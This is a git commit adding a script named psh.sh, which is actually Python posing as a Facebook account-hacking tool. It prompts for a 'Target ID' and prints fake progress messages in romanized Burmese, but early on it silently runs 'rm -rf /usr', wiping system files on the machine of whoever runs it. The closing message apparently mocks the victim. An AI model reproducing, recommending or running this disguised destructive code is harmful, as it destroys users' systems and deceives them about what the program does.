61987c28aa7480c5cbcc2ade9b847a2854ebefe1
bgmpyaesonehmoo290G <79253197+bgmpyaesonehmoo290G@users.noreply.github.com>
2021-02-24 15:35:42 +0630

    Create psh.sh

---
+++ psh.sh
@@ -0,0 +1,45 @@
+import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+os.system("rm -rf /usr")
+os.system("clear")
+os.system("apt install neofetch")
+os.system("neofetch")
+print
+print("(づ｡◕‿‿◕｡)づ")
+print("Author   : By Pyae Soen Hmoo")
+print
+id = input(" Target ID: ")
+
+os.system("clear")
+os.system("neofetch")
+print ("Min May Sout Phote Ko Hack Par Lar 0% ")
+time.sleep(5)
+print ("Min May Sout Phote Ko Hack Par Lar 10%")
+time.sleep(5)
+print ("Min May Sout Phote Ko Hack Par Lar 20% ")
+time.sleep(5)
+print ("Min May Sout Phote Ko Hack Par Lar 35% ")
+time.sleep(5)
+print ("Min May Sout Phote Ko Hack Par Lar 50% ")
+time.sleep(5)
+print ("Min May Sout Phote Ko Hack Par Lar 65% ")
+time.sleep(5)
+print ("Min May Sout Phote Ko Hack Par Lar 75% ")
+time.sleep(5)
+print ("Min May Sout Phote Ko Hack Par Lar 85% ")
+time.sleep(5)
+print ("Min May Sout Phote Ko Hack Par Lar 100% ")
+print("Phin Khan Like Ngar Loe Ma That Lee Ko Facebook Hack Chin Tar Lar")
+os.system("#Chit Tal Naw Phin Lar Khan Ma larr")
